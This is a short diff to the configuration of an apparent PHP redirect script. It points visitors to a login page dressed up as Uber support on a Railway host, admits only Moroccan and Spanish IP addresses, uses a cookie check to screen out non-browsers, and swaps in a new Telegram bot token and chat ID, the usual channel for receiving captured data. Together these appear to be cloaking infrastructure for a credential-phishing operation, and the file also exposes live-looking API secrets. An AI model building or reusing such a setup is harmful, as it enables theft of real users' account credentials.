@@ -1,6 +1,6 @@
 <?php
 // === CONFIG ===
-$redirectUrl      = "https://uncij-production.up.railway.app/";
+$redirectUrl      = "https://uber-support-production.up.railway.app/newlogin.php";
 $allowedCountries = ['MA','ES']; // allowed ISO country codes
 $cookieName       = 'real_browser';
 $logFile          = __DIR__ . '/access_redirect.log';
@@ -9,8 +9,8 @@ $rateLimitFile    = __DIR__ . '/ratelimit.json';
 $geoCacheFile     = __DIR__ . '/geo_cache.json';
 $geoCacheTTL      = 86400; // 24h cache TTL
 $ipinfoToken      = "ca8b78d102f513";
-$telegramBotToken = "8704626168:AAEhWf9sm2gnVpx_crmtiA5h5MrFcfxf8P0";
-$telegramChatId   = "-1003645588226";
+$telegramBotToken = "8674511478:AAEsb89Mtibu4oE9BAEkQUGpaj6kbwyrpX8";
+$telegramChatId   = "-1003916894717";
 
 // === UTILITIES (no config needed below) ===
 function http_get($url) {
